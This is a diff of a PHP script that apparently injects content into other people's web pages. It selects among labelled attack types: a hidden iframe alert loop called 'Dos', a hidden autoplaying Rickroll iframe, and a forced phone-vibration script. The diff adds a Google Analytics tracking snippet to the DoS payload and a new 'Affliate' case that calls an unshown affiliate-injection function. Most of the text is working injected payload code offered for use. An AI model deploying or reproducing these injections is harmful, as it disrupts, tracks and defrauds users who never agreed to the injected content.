@@ -23,9 +23,17 @@ switch($typeOfAttack){
           runScript($textToInsert);
           break;
     case "Dos":
-          $textToInsert="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
+          $textToInsert="<!-- Google Analytics -->
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-XXXXX-Y', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+<!-- End Google Analytics --><iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
           //for($i=0;$i<10;i++){$textToInsert .= $textToInsert};
           runScript($textToInsert);
+            
 
           break;
     case "RickRoll":
@@ -47,18 +55,21 @@ switch($typeOfAttack){
           break;
     case "Vibration":
           $textToInsert =  "<script type='text/javascript'>
-  navigator.vibrate = navigator.vibrate ||
-       navigator.webkitVibrate ||
-       navigator.mozVibrate ||
-       navigator.msVibrate;
+            navigator.vibrate = navigator.vibrate ||
+            navigator.webkitVibrate ||
+            navigator.mozVibrate ||
+            navigator.msVibrate;
 
-  navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500]);
- </script>";
- runScript($textToInsert);
- break;
+            navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000, 500,                1000, 500]);
+            </script>";
+            runScript($textToInsert);
+          break;
+    case "Affliate":
+        runAffliateScript();
+        break;
 
     default:
-          $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
+          $textToInsert="<iframe width='0' height='0'                         src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
           runScript($textToInsert);
           break;
 }
